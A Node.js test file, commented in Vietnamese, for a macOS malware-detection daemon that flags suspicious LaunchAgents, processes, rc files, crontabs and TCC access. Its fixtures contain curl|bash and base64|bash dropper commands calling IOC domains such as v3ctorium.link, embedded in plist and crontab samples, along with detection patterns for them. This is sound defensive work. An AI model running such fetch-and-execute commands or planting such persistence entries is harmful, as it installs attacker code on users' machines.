import test from "node:test";
import assert from "node:assert/strict";
import os from "node:os";
import path from "node:path";

import {
  DEFAULT_ALLOW_PREFIXES,
  SENSITIVE_TCC_SERVICES,
  ancestorPids,
  classifyPersistence,
  classifyProcess,
  classifyStartupText,
  createTrustChecker,
  diffSnapshot,
  expandHome,
  isAllowlisted,
  isSuspiciousPath,
  matchesDropperPattern,
  matchesIocs,
  parsePlistText,
  parsePs,
  parseTccLog,
  readCrontab,
  signatureOf,
} from "../lib/detect.mjs";

const cfg = {
  allow: { pathPrefixes: ["/opt/homebrew/", "/usr/", "/Applications/", "/System/"] },
  suspiciousPathPrefixes: ["~/Desktop/", "~/Downloads/", "/tmp/"],
};
const iocs = {
  labels: ["com.vmware.storage.identitydaemonworker.eq03"],
  domains: ["v3ctorium.link", "blue-metric-42.technology"],
  // Trùng khoá với iocs.json thật: bắt theo MẪU TÊN trên đường dẫn file thực thi.
  namePatterns: ["identitydaemonworker"],
  markers: ["--noproxy"],
};

test("expandHome chỉ mở rộng đúng tiền tố ~/", () => {
  assert.equal(expandHome("~/a/b", "/Users/x"), path.join("/Users/x", "a/b"));
  assert.equal(expandHome("~", "/Users/x"), "/Users/x");
  assert.equal(expandHome("/a/~/b", "/Users/x"), "/a/~/b");
});

test("isSuspiciousPath: Desktop là đáng ngờ, allowlist thì không", () => {
  assert.equal(isSuspiciousPath(path.join(os.homedir(), "Desktop/x/node"), cfg), true);
  assert.equal(isSuspiciousPath("/opt/homebrew/bin/node", cfg), false);
  assert.equal(isSuspiciousPath("/usr/bin/curl", cfg), false);
  assert.equal(isAllowlisted("/opt/homebrew/Cellar/node/26.6.0/bin/node", cfg), true);
});

test("parsePlistText giải mã XML entity và lấy Label/ProgramArguments", () => {
  const xml = `<?xml version="1.0"?><plist version="1.0"><dict>
  <key>Label</key><string>com.x.y</string>
  <key>ProgramArguments</key><array>
    <string>/bin/bash</string><string>-c</string>
    <string>curl -fsSL --noproxy &apos;*&apos; &quot;https://a.b&quot; | bash</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  </dict></plist>`;
  const p = parsePlistText(xml);
  assert.equal(p.Label, "com.x.y");
  assert.equal(p.ProgramArguments.length, 3);
  assert.equal(p.ProgramArguments[2], `curl -fsSL --noproxy '*' "https://a.b" | bash`);
  assert.equal(p.RunAtLoad, true);
  assert.equal(p.KeepAlive, true);
});

test("matchesDropperPattern bắt được curl|bash và base64|sh", () => {
  assert.ok(matchesDropperPattern(`curl -fsSL "https://x" | bash`).length > 0);
  assert.ok(matchesDropperPattern(`wget -qO- https://x | sh`).length > 0);
  assert.ok(matchesDropperPattern(`echo aGk= | base64 -d | bash`).length > 0);
  assert.deepEqual(matchesDropperPattern("/usr/bin/some-daemon --serve"), []);
});

test("matchesDropperPattern nhận marker --noproxy của vụ 24/08", () => {
  const hits = matchesDropperPattern(`curl --noproxy '*' https://v3ctorium.link`);
  assert.ok(hits.some((h) => h.includes("--noproxy")));
});

test("matchesIocs khớp label/domain, bỏ qua chuỗi quá ngắn", () => {
  assert.ok(matchesIocs("com.vmware.storage.identitydaemonworker.eq03", iocs).length > 0);
  assert.ok(matchesIocs("https://blue-metric-42.technology/x", iocs).length > 0);
  assert.deepEqual(matchesIocs("com.apple.Safari", iocs), []);
});

test("classifyPersistence: dropper curl|bash trong LaunchAgent là tín hiệu CỨNG", () => {
  const xml = `<dict><key>Label</key><string>com.vmware.storage.identitydaemonworker.eq03</string>
    <key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string>
    <string>curl -fsSL --noproxy '*' "https://v3ctorium.link" | bash</string></array></dict>`;
  const r = classifyPersistence("/Users/x/Library/LaunchAgents/a.plist", xml, cfg, iocs);
  assert.equal(r.severity, "hard");
  assert.ok(r.reasons.some((x) => x.includes("pipe-to-shell")));
  assert.ok(r.reasons.some((x) => x.startsWith("IOC")));
});

test("classifyPersistence: plist lành tính không bị gắn cờ", () => {
  const xml = `<dict><key>Label</key><string>com.apple.something</string>
    <key>ProgramArguments</key><array><string>/usr/libexec/thing</string></array></dict>`;
  const r = classifyPersistence("/Library/LaunchDaemons/com.apple.x.plist", xml, cfg, iocs);
  assert.equal(r.severity, null);
  assert.deepEqual(r.reasons, []);
});

test("classifyPersistence: RunAtLoad+KeepAlive với binary ngoài allowlist là tín hiệu MỀM", () => {
  const xml = `<dict><key>Label</key><string>com.example.helper</string>
    <key>ProgramArguments</key><array><string>/Users/x/.local/bin/helper</string></array>
    <key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict>`;
  const r = classifyPersistence("/Users/x/Library/LaunchAgents/com.example.helper.plist", xml, cfg, iocs);
  assert.equal(r.severity, "medium");
});

test("classifyProcess: binary trong /opt/homebrew KHÔNG bị gắn cờ (tránh tự bắn vào harness)", () => {
  const p = {
    pid: 999,
    uid: process.getuid(),
    argv0: "/opt/homebrew/Cellar/node/26.6.0/bin/node",
    command: "/opt/homebrew/Cellar/node/26.6.0/bin/node /opt/homebrew/bin/dsh web",
  };
  const r = classifyProcess(p, cfg, iocs);
  assert.equal(r.severity, null);
});

test("classifyProcess: binary chạy từ Desktop là tín hiệu CỨNG", () => {
  const argv0 = path.join(os.homedir(), "Desktop", "QUARANTINE", "node");
  const r = classifyProcess({ pid: 1, uid: 0, argv0, command: `${argv0} app.js` }, cfg, iocs);
  assert.equal(r.severity, "hard");
  assert.ok(r.reasons.some((x) => x.includes("vùng đáng ngờ")));
});

test("classifyProcess: bỏ qua chính tiến trình của mình", () => {
  const argv0 = path.join(os.homedir(), "Desktop", "x");
  const r = classifyProcess({ pid: process.pid, uid: 0, argv0, command: argv0 }, cfg, iocs, process.pid);
  assert.equal(r.severity, null);
});

test("parsePs đọc đúng pid/ppid/uid/command có khoảng trắng", () => {
  const rows = parsePs("  123  1  501 /usr/bin/foo --bar baz\n  456  123  0 /bin/sh -c 'a b'\n");
  assert.equal(rows.length, 2);
  assert.deepEqual(rows[0], { pid: 123, ppid: 1, uid: 501, command: "/usr/bin/foo --bar baz", argv0: "/usr/bin/foo" });
  assert.equal(rows[1].uid, 0);
});

test("diffSnapshot phát hiện file mới và file sửa", () => {
  const prev = new Map([["/a", 1], ["/b", 2]]);
  const next = new Map([["/a", 1], ["/b", 9], ["/c", 3]]);
  const d = diffSnapshot(prev, next);
  assert.deepEqual(
    d.sort((x, y) => x.path.localeCompare(y.path)).map((x) => `${x.path}:${x.kind}`),
    ["/b:modified", "/c:new"],
  );
});

test("SENSITIVE_TCC_SERVICES phủ các quyền stealer luôn nhắm", () => {
  for (const s of ["kTCCServiceAccessibility", "kTCCServiceScreenCapture", "kTCCServiceSystemPolicyAllFiles"]) {
    assert.ok(SENSITIVE_TCC_SERVICES.has(s), s);
  }
});

// --- Hồi quy cho lỗi tìm ra ngày 22/09/2026 khi test end-to-end ---

test("classifyProcess KHÔNG gắn cờ khi chuỗi IOC chỉ nằm trong THAM SỐ", () => {
  // Đây là lỗi thật: lệnh bash đang viết báo cáo về mã độc có chứa domain IOC,
  // nếu khớp trên tham số thì cơ chế sẽ kill chính phiên agent đang xử lý sự cố.
  const p = {
    pid: 14105,
    ppid: 1227,
    uid: process.getuid(),
    argv0: "bash",
    command: `bash -c 'cat > x.plist <<EOT ... curl --noproxy "*" https://v3ctorium.link | bash ... EOT'`,
  };
  assert.equal(classifyProcess(p, cfg, iocs).severity, null);
});

test("classifyProcess vẫn bắt được binary tên khớp IOC trong vùng đáng ngờ", () => {
  const exe = path.join(os.homedir(), "Desktop", "identitydaemonworker", "node");
  const r = classifyProcess({ pid: 7, ppid: 1, uid: 0, argv0: exe, command: exe }, cfg, iocs);
  assert.equal(r.severity, "hard");
  assert.ok(r.reasons.some((x) => x.startsWith("IOC")));
});

test("ancestorPids gom được tổ tiên để daemon không tự kill chính mình", () => {
  const procs = [
    { pid: 1, ppid: 0 },
    { pid: 100, ppid: 1 },
    { pid: 200, ppid: 100 },
    { pid: 300, ppid: 200 },
  ];
  const anc = ancestorPids(procs, 300);
  assert.ok(anc.has(200) && anc.has(100) && anc.has(1));
  assert.equal(anc.has(300), false);
  // Không lặp vô hạn nếu dữ liệu ppid hỏng.
  assert.ok(ancestorPids([{ pid: 5, ppid: 5 }], 5).size <= 65);
});

// --- Watcher TCC đường log (dùng khi daemon không có Full Disk Access) ---

const TCC_LOG_SAMPLE = [
  '2026-09-22 11:46:08.011 Df tccd[661:f2eaf] [com.apple.TCC:access] AUTHREQ_CTX: msgID=11107.1, function=<private>, service=kTCCServiceAccessibility, preflight=no, query=1, client_dict=(null), daemon_dict=<private>',
  '2026-09-22 11:46:08.011 Df tccd[661:f2eaf] [com.apple.TCC:access] AUTHREQ_ATTRIBUTION: msgID=11107.1, attribution={responsible={TCCDProcess: identifier=com.apple.siriactionsd, pid=11102, auid=501, euid=501, binary_path=/System/Library/PrivateFrameworks/VoiceShortcuts.framework/Versions/A/Support/siriactionsd}, accessing={TCCDProcess: identifier=com.evil.stealer, pid=11107, auid=501, euid=501, binary_path=/Users/x/Desktop/SystemUpdater.app/Contents/MacOS/App}, requesting={TCCDProcess: identifier=com.apple.calaccessd, pid=10538, auid=501, euid=501, binary_path=/System/Library/PrivateFrameworks/CalendarDaemon.framework/Support/calaccessd}, },',
  '2026-09-22 11:46:09.352 Df tccd[661:f2eaf] [com.apple.TCC:access] AUTHREQ_CTX: msgID=10538.26, function=TCCAccessRequest, service=kTCCServiceCalendar, preflight=yes, query=1, client_dict=(null), daemon_dict=<private>',
  '2026-09-22 11:46:09.352 Df tccd[661:f2eaf] [com.apple.TCC:access] AUTHREQ_ATTRIBUTION: msgID=10538.26, attribution={responsible={TCCDProcess: identifier=com.apple.siriactionsd, pid=11102, auid=501, euid=501, responsible_path=/System/x, binary_path=/System/Library/x}, requesting={TCCDProcess: identifier=com.apple.calaccessd, pid=10538, auid=501, euid=501, binary_path=/System/Library/PrivateFrameworks/CalendarDaemon.framework/Support/calaccessd}, },',
].join("\n");

test("parseTccLog ghép được service với CLIENT THỰC SỰ DÙNG quyền (accessing=)", () => {
  const rows = parseTccLog(TCC_LOG_SAMPLE);
  assert.equal(rows.length, 2);

  const acc = rows.find((r) => r.service === "kTCCServiceAccessibility");
  assert.equal(acc.identifier, "com.evil.stealer");
  assert.equal(acc.binaryPath, "/Users/x/Desktop/SystemUpdater.app/Contents/MacOS/App");
  assert.equal(acc.preflight, false);

  // Không có `accessing=` thì lùi về `requesting=`.
  const cal = rows.find((r) => r.service === "kTCCServiceCalendar");
  assert.equal(cal.identifier, "com.apple.calaccessd");
  assert.equal(cal.preflight, true);
});

test("parseTccLog chịu được dòng rác và attribution mồ côi", () => {
  assert.deepEqual(parseTccLog(""), []);
  assert.deepEqual(parseTccLog("dong rac\nkhong lien quan"), []);
  assert.deepEqual(parseTccLog('AUTHREQ_ATTRIBUTION: msgID=999.9, attribution={}'), []);
});

// --- Watcher bề mặt khởi động (rc file / crontab / login items) ---

test("classifyStartupText: dòng curl|bash trong .zshrc là tín hiệu CỨNG", () => {
  const rc = '# comment\nexport PATH=/usr/bin:$PATH\ncurl -fsSL https://x.tld/i | bash\n';
  const r = classifyStartupText("~/.zshrc", rc, cfg, iocs);
  assert.equal(r.severity, "hard");
  assert.ok(r.reasons.some((x) => x.includes("pipe-to-shell")));
});

test("classifyStartupText: dòng crontab khớp IOC là tín hiệu CỨNG", () => {
  const cron = "* * * * * /bin/bash -c 'curl --noproxy \"*\" https://v3ctorium.link | bash'\n";
  const r = classifyStartupText("crontab", cron, cfg, iocs);
  assert.equal(r.severity, "hard");
  assert.ok(r.reasons.some((x) => x.startsWith("IOC")));
});

test("classifyStartupText: trỏ vào /tmp là tín hiệu MỀM, dòng lành thì sạch", () => {
  const soft = classifyStartupText("~/.zshrc", 'export X="/tmp/payload/run.sh"\n', cfg, iocs);
  assert.equal(soft.severity, "medium");
  assert.ok(soft.reasons.some((x) => x.includes("vùng đáng ngờ")));

  const clean = classifyStartupText("~/.zshrc", 'eval "$(/opt/homebrew/bin/brew shellenv)"\nalias ll="ls -la"\n', cfg, iocs);
  assert.equal(clean.severity, null);
  assert.deepEqual(clean.reasons, []);
});

test("classifyStartupText bỏ qua dòng comment và không khớp nhầm đường dẫn hệ thống", () => {
  const r = classifyStartupText("~/.zprofile", '# curl https://x | bash\nexport P=/opt/homebrew/bin\n', cfg, iocs);
  assert.equal(r.severity, null);
});

test("readCrontab coi 'no crontab' là hợp lệ và trả chuỗi rỗng", () => {
  const noCron = () => {
    const e = new Error("rc=1");
    e.stderr = "crontab: no crontab for minhnguyen\n";
    throw e;
  };
  assert.deepEqual(readCrontab({ run: noCron }), { ok: true, text: "" });

  const err = () => {
    const e = new Error("rc=1");
    e.stderr = "operation not permitted\n";
    throw e;
  };
  const r = readCrontab({ run: err });
  assert.equal(r.ok, false);
  assert.ok(r.error.includes("not permitted"));

  const ok = readCrontab({ run: () => "*/5 * * * * /bin/x\n" });
  assert.equal(ok.ok, true);
  assert.ok(ok.text.includes("*/5"));
});

// ---------------------------------------- miễn trừ updater theo CHỮ KÝ SỐ (24/09/2026)

test("signatureOf: đọc đúng Authority từ STDERR của codesign (không phải stdout)", () => {
  // Hồi quy: execFileSync chỉ trả stdout ⇒ authorities rỗng ⇒ không binary nào được tin cậy.
  const canned = {
    status: 0,
    stdout: "",
    stderr:
      "Executable=/bin/ls\nCodeDirectory v=20400 flags=0x0(none)\nSignature size=4442\n" +
      "Authority=Software Signing\nAuthority=Apple Code Signing Certification Authority\n",
  };
  const sig = signatureOf("/bin/ls", { spawn: () => canned });
  assert.equal(sig.ok, true);
  assert.deepEqual(sig.authorities, ["Software Signing", "Apple Code Signing Certification Authority"]);
});

test("signatureOf: lấy TeamIdentifier, và lùi về chuỗi Authority khi thiếu", () => {
  const withTeam = {
    status: 0, stdout: "",
    stderr: "Authority=Developer ID Application: Microsoft Corporation (UBF8T346G9)\nTeamIdentifier=UBF8T346G9\n",
  };
  assert.equal(signatureOf("/x", { spawn: () => withTeam }).teamId, "UBF8T346G9");

  const noTeamLine = {
    status: 0, stdout: "",
    stderr: "Authority=Developer ID Application: Microsoft Corporation (UBF8T346G9)\n",
  };
  assert.equal(signatureOf("/x", { spawn: () => noTeamLine }).teamId, "UBF8T346G9", "phải lấy được từ Authority");
});

test("signatureOf: 'not set' và ad-hoc ⇒ không có Team ID, không tin cậy", () => {
  const adhoc = { status: 0, stdout: "", stderr: "Signature=adhoc\nTeamIdentifier=not set\n" };
  const sig = signatureOf("/x", { spawn: () => adhoc });
  assert.equal(sig.teamId, null);
  assert.equal(sig.adhoc, true);
  assert.equal(createTrustChecker({ spawn: () => adhoc })("/x").trusted, false);
});

test("createTrustChecker: nhận Microsoft theo Team ID, Apple theo Authority, chối ad-hoc", () => {
  const mk = (stderr) => createTrustChecker({ spawn: () => ({ status: 0, stdout: "", stderr }) });
  assert.equal(mk("TeamIdentifier=UBF8T346G9\nAuthority=Developer ID Application: Microsoft Corporation (UBF8T346G9)\n")("/a").trusted, true);
  assert.equal(mk("Authority=Software Signing\n")("/b").trusted, true);
  assert.equal(mk("Signature=adhoc\nTeamIdentifier=not set\n")("/c").trusted, false);
  assert.equal(mk("TeamIdentifier=ZZZZZZZZZZ\nAuthority=Developer ID Application: Evil Corp (ZZZZZZZZZZ)\n")("/d").trusted, false);
});

test("TÍCH HỢP: /bin/ls là binary Apple ký thật ⇒ tin cậy (chỉ chạy trên macOS)", { skip: process.platform !== "darwin" }, () => {
  const sig = signatureOf("/bin/ls");
  assert.equal(sig.ok, true);
  assert.ok(sig.authorities.some((a) => /Software Signing/.test(a)), JSON.stringify(sig.authorities));
  assert.equal(createTrustChecker()("/bin/ls").trusted, true);
});

const trustYes = () => ({ trusted: true, why: "TeamID UBF8T346G9" });
const trustNo = () => ({ trusted: false, why: null });

test("classifyProcess: helper từ /tmp NHƯNG ký bởi Microsoft ⇒ ALLOW (không kill)", () => {
  const exe = "/tmp/MAU-helper/Microsoft AutoUpdate";
  const r = classifyProcess({ pid: 5, uid: 0, argv0: exe, command: exe }, cfg, iocs, 1, new Set(), { trust: trustYes });
  assert.equal(r.severity, "allow");
  assert.match(r.reasons[0], /TeamID UBF8T346G9/);
});

test("CHỐNG HỞ: từ /tmp TỰ XƯNG 'Microsoft AutoUpdate' mà không có chữ ký ⇒ vẫn HARD", () => {
  const exe = "/tmp/Microsoft AutoUpdate";
  const r = classifyProcess({ pid: 5, uid: 0, argv0: exe, command: exe }, cfg, iocs, 1, new Set(), { trust: trustNo });
  assert.equal(r.severity, "hard");
  assert.ok(r.reasons.some((x) => x.includes("vùng đáng ngờ")));
});

test("CHỐNG HỞ: khớp IOC THẮNG miễn trừ chữ ký", () => {
  const exe = os.homedir() + "/Desktop/identitydaemonworker/run";
  const r = classifyProcess({ pid: 5, uid: 0, argv0: exe, command: exe }, cfg, iocs, 1, new Set(), { trust: trustYes });
  assert.equal(r.severity, "hard", "miễn trừ không được che dấu hiệu IOC");
  assert.ok(r.reasons.some((x) => x.startsWith("IOC")));
});

test("cfg.trustSignatures=false ⇒ tắt hẳn miễn trừ (vẫn HARD)", () => {
  const exe = "/tmp/updater";
  const off = { ...cfg, trustSignatures: false };
  const r = classifyProcess({ pid: 5, uid: 0, argv0: exe, command: exe }, off, iocs, 1, new Set(), { trust: trustYes });
  assert.equal(r.severity, "hard");
});

test("/Library/Developer (CoreSimulator) đã vào allowlist ⇒ không còn alert oan", () => {
  const exe = "/Library/Developer/PrivateFrameworks/CoreSimulator.framework/Resources/bin/simctl";
  const cfgAll = { ...cfg, allow: { pathPrefixes: DEFAULT_ALLOW_PREFIXES } };
  const r = classifyProcess({ pid: 9, uid: 0, argv0: exe, command: exe }, cfgAll, iocs, 1, new Set(), { trust: trustNo });
  assert.equal(r.severity, null);
});
